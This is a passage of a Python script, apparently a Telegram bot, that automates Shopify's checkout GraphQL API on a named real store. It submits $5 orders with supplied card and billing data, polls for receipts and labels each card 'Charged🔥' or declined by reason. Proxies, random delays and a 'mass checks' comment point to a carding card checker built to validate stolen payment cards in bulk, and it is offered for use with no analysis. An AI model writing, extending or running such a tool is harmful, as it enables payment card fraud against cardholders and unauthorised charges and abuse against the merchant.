__typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment RemoteBuyerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}__typename}',
        'variables': {
            'input': {
                'sessionInput': {
                    'sessionToken': x,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'lines': [
                                    {
                                        'stableId': stableid,
                                    },
                                ],
                            },
                            'deliveryMethodTypes': [
                                'NONE',  # For digital product, no shipping
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': True,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stableid,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': 'gid://shopify/ProductVariantMerchandise/41957285840',
                                    'variantId': 'gid://shopify/ProductVariant/41957285840',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': '5.00',
                                    'currencyCode': 'USD',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [
                        {
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentmethodidentifier,
                                    'sessionId': sid,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': addr1,
                                            'address2': addr2,
                                            'city': city,
                                            'countryCode': country_code,
                                            'postalCode': postal,
                                            'lastName': addr_last,
                                            'firstName': rfirst,
                                            'zoneCode': zone,
                                            'phone': '',
                                        },
                                    },
                                    'cardSource': None,
                                },
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None,
                            },
                            'amount': {
                                'value': {
                                    'amount': '5',
                                    'currencyCode': 'USD',
                                },
                            },
                        },
                    ],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr1,
                            'address2': addr2,
                            'city': city,
                            'countryCode': country_code,
                            'postalCode': postal,
                            'lastName': rlast,
                            'firstName': rfirst,
                            'zoneCode': zone,
                            'phone': '',
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': 'USD',
                        'countryCode': 'US',
                    },
                    'email': remail,
                    'emailChanged': False,
                    'phoneCountryCode': 'US',
                    'marketingConsent': [
                        {
                            'email': {
                                'value': remail,
                            },
                        },
                    ],
                    'shopPayOptInPhone': {
                        'countryCode': 'US',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': '0',
                            'currencyCode': 'USD',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [
                        {
                            'key': '_source',
                            'value': 'Rebuy',
                        },
                        {
                            'key': '_attribution',
                            'value': 'Smart Cart 2.0',
                        },
                    ],
                },
                'localizationExtension': {
                    'fields': [],
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'cartMetafields': [],
            },
            'attemptToken': f'{tok}',
            'metafields': [],
            'analytics': {
                'requestUrl': f'https://violettefieldthreads.com/checkouts/cn/{tok}/en-us?auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            },
        },
        'operationName': 'SubmitForCompletion',
    }

    response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql',
        params=params,
        headers=headers,
        json=json_data,
        proxies=proxy if proxy else None
    )
    raw = response.text
    print(f"Submit Response: {raw[:500]}...")  # Debug log
    try:
        res_json = json.loads(raw)
        submit_data = res_json['data']['submitForCompletion']
        if 'receipt' in submit_data or submit_data.get('__typename') in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            rid = submit_data['receipt']['id'] if 'receipt' in submit_data else submit_data.get('receipt', {}).get('id')
            print(f"Receipt ID: {rid}")
        elif 'buyerProposal' in submit_data or submit_data.get('__typename') == 'SubmitRejected':
            print("Submit returned buyerProposal - rejected.")
            errors = submit_data.get('errors', [])
            if errors:
                for e in errors:
                    code = e.get('code', 'Unknown')
                    msg = e.get('localizedMessage', 'No message')
                    print(f"Error Code: {code}, Message: {msg}")
                    if 'avs' in code.lower() or 'address' in msg.lower():
                        return "Declined: AVS/Address Mismatch"
                    elif 'fraud' in code.lower() or 'risk' in code.lower():
                        return "Declined: Fraud/Risk Detected"
                    elif 'price' in msg.lower() or 'total' in msg.lower():
                        return "Declined: Price Mismatch"
                    else:
                        return f"Declined: {code} - {msg}"
            else:
                return "Declined: Rejected (negotiation required or fraud detected)"
        else:
            # Check for other cases like Throttled
            if 'Throttled' in str(submit_data):
                return "Throttled: Rate limited"
            errors = res_json.get('errors', [])
            if errors:
                return f"GraphQL Error: {errors[0].get('message', 'Unknown')}"
            return "Failed at step 5: Unexpected response structure."
            
    except (json.JSONDecodeError, KeyError, TypeError) as e:
        print(f"Parse error: {e}")
        print(f"Raw response: {raw[:300]}")
        return f"Failed at step 5: Could not parse response. Error: {e}"

    random_delay(1, 2)

    # Step 6: Poll for receipt
    print("Step 6: Polling for receipt...")
    headers = {
        'authority': 'violettefieldthreads.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/json',
        'origin': 'https://violettefieldthreads.com',
        'referer': 'https://violettefieldthreads.com/',
        'sec-fetch-site': 'same-origin',
        'shopify-checkout-client': 'checkout-web/1.0',
        'user-agent': user_agent,
        'x-checkout-one-session-token': x,
        'x-checkout-web-deploy-stage': 'production',
        'x-checkout-web-server-handling': 'fast',
        'x-checkout-web-server-rendering': 'yes',
    }
    params = {
        'operationName': 'PollForReceipt',
    }
    json_data = {
        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}paymentIcon __typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}finalizedRemoteCheckouts{...FinalizedRemoteCheckoutsResult __typename}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ProcessingRemoteCheckoutsReceipt{id pollDelay remoteCheckouts{...on SubmittingRemoteCheckout{shopId __typename}...on SubmittedRemoteCheckout{shopId __typename}__typename}__typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment FinalizedRemoteCheckoutsResult on FinalizedRemoteCheckout{shopId result{...on ProcessedRemoteReceipt{orderIdentity{buyerIdentifier id __typename}orderStatusPageUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}payment{paymentLines{amount{amount currencyCode __typename}__typename}__typename}delivery{deliveryLines{deliveryStrategy{handle title __typename}lineAmount{amount currencyCode __typename}__typename}__typename}__typename}__typename}...on FailedRemoteReceipt{recoveryUrl remotePurchaseOrder{merchandise{merchandiseLines{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{productId title productTitle image{altText url(transform:{maxWidth:64,maxHeight:64})__typename}price{amount currencyCode __typename}__typename}__typename}__typename}__typename}checkoutTotal{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}tax{totalTaxAmountV2{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}',
        'variables': {
            'receiptId': rid,
            'sessionToken': x,
        },
        'operationName': 'PollForReceipt',
    }
    
    status = "Declined!❌"
    resp_msg = "Processing Failed!"
    
    max_retries = 10
    order_details = {}
    
    for attempt in range(max_retries):
        random_delay(1, 2)  # Short delay between polls
        final_response = session.post('https://violettefieldthreads.com/checkouts/unstable/graphql', 
                                      params=params, 
                                      headers=headers, 
                                      json=json_data, 
                                      proxies=proxy if proxy else None)
        final_text = final_response.text
        
        print(f"\n=== Poll Attempt {attempt + 1} DEBUG ===")
        print(f"Status Code: {final_response.status_code}")
        print(f"Response Length: {len(final_text)} chars")
        print(f"Response Snippet: {final_text[:300]}...")
        
        if "thank" in final_text.lower() or '"__typename":"ProcessedReceipt"' in final_text:
            status = "Charged🔥"
            resp_msg = "ORDER_PLACED"
            
            print(f"\n🔥 ORDER SUCCESSFUL! 🔥")
            print(f"Full Response: {final_text[:1000]}...")
            
            try:
                response_json = json.loads(final_text)
                receipt_data = response_json.get('data', {}).get('receipt', {})
                
                order_id = receipt_data.get('id', 'N/A')
                redirect_url = receipt_data.get('redirectUrl', 'N/A')
                confirmation_url = receipt_data.get('confirmationPage', {}).get('url', 'N/A')
                order_status_url = receipt_data.get('orderStatusPageUrl', 'N/A')
                
                order_details = {
                    'order_id': order_id,
                    'redirect_url': redirect_url,
                    'confirmation_url': confirmation_url,
                    'order_status_url': order_status_url
                }
                
                print(f"Order ID: {order_id}")
                print(f"Redirect URL: {redirect_url}")
                print(f"Confirmation URL: {confirmation_url}")
                print(f"Order Status URL: {order_status_url}")
                
            except Exception as e:
                print(f"Error parsing order details: {e}")
            break
        elif "actionrequiredreceipt" in final_text.lower():
            status = "Declined!❌"
            resp_msg = "3D_SECURE_REQUIRED"
            print(f"\n❌ 3D Secure Required")
            print(f"Response: {final_text[:500]}...")
            break
        elif "processingreceipt" in final_text.lower() or "waitingreceipt" in final_text.lower():
            print("⏳ Still processing...")
            time.sleep(2)  # Slightly longer wait during processing
            continue
        else:
            # Try to extract error code
            error_code = find_between(final_text, '"code":"', '"').lower()
            print(f"\n❌ Payment Failed")
            print(f"Error Code: {error_code}")
            print(f"Response: {final_text[:500]}...")
            
            if "fraud" in error_code or "buyerproposal" in final_text.lower():
                resp_msg = "FRAUD_SUSPECTED"
            elif "insufficient_funds" in error_code:
                resp_msg = "INSUFFICIENT_FUNDS"
            else:
                resp_msg = "CARD_DECLINED"
            break
            
    elapsed_time = time.time() - start_time
    print(f"\n=== CHECK COMPLETED ===")
    print(f"Time: {elapsed_time:.2f}s")
    print(f"Status: {resp_msg}")
    print(f"========================\n")

    # Final random delay before next check (for mass checks)
    random_delay(5, 10)

    result = {
        'full_card': full_card, 
        'status': status, 
        'resp_msg': resp_msg,
        'username': username, 
        'dev': 'D E A T H - 👑',
        'order_details': order_details,
        'elapsed_time': f"{elapsed_time:.2f}s"
    }
    return result

# The rest of the bot handlers remain the same...
@bot.message_handler(commands=['start'])
def start(message):
